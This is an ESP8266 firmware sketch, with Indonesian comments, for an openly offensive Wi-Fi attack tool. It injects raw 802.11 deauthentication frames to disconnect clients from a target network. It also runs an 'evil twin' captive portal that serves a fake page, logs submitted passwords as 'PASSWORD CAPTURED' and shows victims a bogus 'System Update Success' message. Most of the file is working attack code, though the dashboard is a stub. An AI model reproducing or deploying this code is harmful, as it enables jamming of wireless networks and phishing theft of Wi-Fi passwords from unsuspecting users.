/* * M1Z23R X GMPRO2 v5.6 - ULTIMATE DEAUTH EDITION
 * SDK SUPPORTED: ESP8266 v3.0.2 (Deauth Enabled)
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>

extern "C" {
  #include "user_interface.h"
}

// --- KONFIGURASI KUNCI ---
ESP8266WebServer server(80);
DNSServer dnsServer;
String target_ssid = "";
uint8_t target_ch = 1;
bool deauth_active = false;
bool prank_active = false;
bool eviltwin_active = false;

// --- FUNGSI CORE DEAUTH (Bypass SDK) ---
void sendDeauth(uint8_t* targetMac, uint8_t* apMac, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],
    apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
    apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
    0x00, 0x00, 0x01, 0x00
  };
  wifi_send_pkt_freedom(packet, 26, 0);
  yield();
}

// --- LOGGING SYSTEM ---
void addLog(String msg) {
  File f = LittleFS.open("/log.txt", "a");
  if(f) { f.println("[" + String(millis()/1000) + "s] " + msg); f.close(); }
}

// --- HANDLERS (Sesuai Dashboard v5.6) ---
void handleRoot() {
  // Masukkan kode HTML Dashboard v5.6 yang sudah kita kunci di sini
  // (Karena teks terlalu panjang, gunakan variable String atau letakkan di LittleFS)
}

void handlePost() {
  if (server.hasArg("pw")) {
    String pass = server.arg("pw");
    addLog("!!! PASSWORD CAPTURED: " + pass);
    // AUTO-STOP: Berhenti menyerang jika dapat pass
    deauth_active = false; eviltwin_active = false;
    server.send(200, "text/html", "<h2>System Update Success</h2>");
  }
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  
  // Setup AP Awal
  WiFi.softAP("GMpro2_Setup", "12345678");
  dnsServer.start(53, "*", WiFi.softAPIP());

  // API Routes (KUNCI)
  server.on("/", handleRoot);
  server.on("/post", HTTP_POST, handlePost);
  server.on("/clear_log", [](){ LittleFS.remove("/log.txt"); server.send(200, "text/plain", "Log Cleared"); });
  
  server.onNotFound([]() {
    if (eviltwin_active && LittleFS.exists("/etwin.html")) {
      File f = LittleFS.open("/etwin.html", "r"); server.streamFile(f, "text/html"); f.close();
    } else if (prank_active && LittleFS.exists("/prank.html")) {
      File f = LittleFS.open("/prank.html", "r"); server.streamFile(f, "text/html"); f.close();
    } else {
      handleRoot();
    }
  });

  server.begin();
  wifi_set_opmode(STATIONAP_MODE);
  wifi_promiscuous_enable(1); // Enable Packet Injection
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Logika Serangan (Hybrid/Deauth)
  if (deauth_active) {
    static unsigned long lastDeauth = 0;
    if (millis() - lastDeauth > 100) { // Interval Deauth
      // Broadcast Deauth ke Target
      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      uint8_t targetMac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // Diisi saat Select Target
      sendDeauth(broadcast, targetMac, target_ch);
      lastDeauth = millis();
    }
  }
}
